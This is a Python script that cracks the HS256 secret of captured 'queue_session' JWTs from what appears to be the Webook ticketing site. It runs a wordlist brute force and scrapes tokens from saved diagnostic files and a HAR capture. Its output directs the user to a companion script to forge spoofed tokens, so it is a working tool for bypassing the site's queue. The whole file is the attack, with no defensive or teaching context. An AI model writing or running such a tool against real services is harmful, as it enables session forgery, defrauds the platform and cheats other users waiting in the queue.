#!/usr/bin/env python3
"""
Crack webook queue_session JWT HS256 secret from captured tokens.

Usage:
    python crack-queue-jwt.py <wordlist> [token1 token2 ...]
    python crack-queue-jwt.py jwt.secrets.list

If no tokens are provided on the command line, the script scans the local
project for saved queue_session JWTs and uses them.
"""

import base64
import hmac
import hashlib
import json
import os
import re
import sys


def find_queue_tokens():
    """Scan project files for saved queue_session JWTs."""
    tokens = set()
    files = [
        "diagnose-queue-output/01_initial.json",
        "diagnose-queue-output/02_after_login.json",
        "diagnose-queue-output/network.json",
        "diagnose-queue-loggedin.json",
        "diagnose-queue-cross-event.json",
        "tls-analysis/captures/webook-1784914965445.har",
    ]
    for path in files:
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
            for t in re.findall(
                r"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[^\s\"'\[\]{}<>;]+", text
            ):
                tokens.add(t.rstrip(";"))
        except Exception:
            pass
    return sorted(tokens)


def decode_payload(token):
    parts = token.split(".")
    return json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())


def verify(token, secret):
    parts = token.split(".")
    msg = (parts[0] + "." + parts[1]).encode()
    expected = base64.urlsafe_b64decode(parts[2] + "==")
    sig = hmac.new(
        secret if isinstance(secret, bytes) else secret.encode("utf-8", errors="ignore"),
        msg,
        hashlib.sha256,
    ).digest()
    return hmac.compare_digest(sig, expected)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    wordlist_path = sys.argv[1]
    tokens = sys.argv[2:] or find_queue_tokens()

    if not tokens:
        print("No queue_session tokens found. Provide them as arguments.")
        sys.exit(1)

    print(f"Loaded {len(tokens)} token(s).")
    for t in tokens:
        try:
            p = decode_payload(t)
            print(f"  n={p.get('n'):>8}  e={p.get('e')}")
        except Exception:
            print(f"  (decode error) {t[:40]}")

    if not os.path.exists(wordlist_path):
        print(f"Wordlist not found: {wordlist_path}")
        sys.exit(1)

    print(f"\nBrute-forcing with {wordlist_path} ...")
    count = 0
    found = None
    with open(wordlist_path, "rb") as f:
        for line in f:
            secret = line.rstrip(b"\n").rstrip(b"\r")
            if not secret:
                continue
            count += 1
            if count % 10000 == 0:
                print(f"  tested {count}...", file=sys.stderr)
            if all(verify(t, secret) for t in tokens):
                found = secret.decode("utf-8", errors="ignore")
                break

    if found:
        print(f"\nFOUND SECRET: {found}")
        print("\nUse it with forge-queue-jwt.py to create a spoofed token.")
    else:
        print(f"\nSecret not found in {count} wordlist entries.")
        print("Try a larger wordlist, hashcat, or a targeted brute-force.")


if __name__ == "__main__":
    main()
